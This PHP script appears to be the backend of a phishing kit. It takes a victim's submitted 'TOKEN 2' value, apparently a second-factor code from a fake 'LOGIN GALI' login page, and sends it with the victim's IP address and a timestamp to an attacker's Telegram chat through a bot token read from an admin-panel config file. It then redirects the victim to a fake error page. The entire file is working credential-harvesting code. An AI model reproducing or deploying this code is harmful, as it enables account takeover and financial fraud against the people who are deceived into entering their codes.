<?php

// Lee el contenido del archivo config.json
$config_file_path = './panel-adm/config.json';
$config_content = file_get_contents($config_file_path);

// Decodifica el contenido JSON en un array asociativo
$config_data = json_decode($config_content, true);

// Verifica si se pudo leer y decodificar correctamente el archivo
if ($config_data === null) {
    die('Error al leer el archivo de configuración.');
}

// Obtiene el token y el chat_id
$token = $config_data['token'];
$chat_id = $config_data['chat_id'];


if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $nombre = isset($_POST['tok2']) ? $_POST['tok2'] : '';

    $ip = $_SERVER['REMOTE_ADDR'];
    $fecha = date('Y-m-d');
    $hora = date('H:i:s');

    $message = "<b>=== LOGIN GALI ===</b>\n";
    $message .= "<i>👤| TOKEN 2:</i> <code>$nombre</code>\n";
    $message .= "<b>=====================</b>\n";
    $message .= "<i>📌| IP:</i> $ip\n";
    $message .= "<i>📅| Fecha:</i> $fecha\n";
    $message .= "<i>⏰| Hora:</i> $hora\n";
    $message .= "<b>=====================</b>";


    // URL del bot de Telegram para enviar mensajes
    $telegram_api_url = "https://api.telegram.org/bot$token/sendMessage";

    // Datos a enviar al bot de Telegram
    $telegram_data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML',
    ];

    // Configuración de la solicitud HTTP
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($telegram_data), // Aquí es donde se generó el error anterior
        ],
    ];

    // Realiza la solicitud al bot de Telegram
    $context = stream_context_create($options);
    $result = file_get_contents($telegram_api_url, false, $context);

    // Verifica si la solicitud fue exitosa
    if ($result === false) {
        // Maneja el error si la solicitud no fue exitosa
        echo 'Error al enviar el mensaje a Telegram: ' . error_get_last()['message'];
        exit;
    }

    // Puedes realizar alguna acción después de enviar los datos a Telegram, si es necesario.
    header("Location: errorvery.html");
    exit;
}
